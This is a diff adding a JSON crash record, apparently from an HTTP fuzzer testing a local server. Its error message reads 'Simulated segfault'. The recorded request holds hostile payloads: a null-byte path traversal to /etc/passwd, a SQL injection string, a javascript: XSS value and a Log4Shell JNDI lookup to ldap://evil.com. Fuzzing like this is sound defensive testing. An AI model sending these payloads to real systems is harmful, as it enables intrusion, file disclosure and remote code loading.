@@ -1,0 +1,24 @@
+{
+  "timestamp": "2025-12-29T14:40:04.779407",
+  "crash_type": "segfault",
+  "payload": "CONNECT /.\u0000.//.\u0000.//.\u0000.//etc/passwd?\nHeaders: {'User-Agent': \"' OR '1'='1\", 'Accept-Encoding': 'gzip, deflate', 'Accept': '*/*', 'Connection': 'close', 'Host': '127.0.0.1:8080', 'X-Forwarded-For': 'javascript:alert(1)', 'Accept-Language': '${${lower:j}ndi:ldap://evil.com/a}', 'Content-Type': 'A\\x00B', 'Content-Length': '0'}",
+  "payload_hash": "15c1b87e709c9974",
+  "request_method": "CONNECT",
+  "request_path": "/.\u0000.//.\u0000.//.\u0000.//etc/passwd?",
+  "request_headers": {
+    "User-Agent": "' OR '1'='1",
+    "Accept-Encoding": "gzip, deflate",
+    "Accept": "*/*",
+    "Connection": "close",
+    "Host": "127.0.0.1:8080",
+    "X-Forwarded-For": "javascript:alert(1)",
+    "Accept-Language": "${${lower:j}ndi:ldap://evil.com/a}",
+    "Content-Type": "A\u0000B",
+    "Content-Length": "0"
+  },
+  "request_body": "",
+  "error_message": "Simulated segfault",
+  "stack_trace": null,
+  "fuzzer_variant": null,
+  "iteration": 287
+}
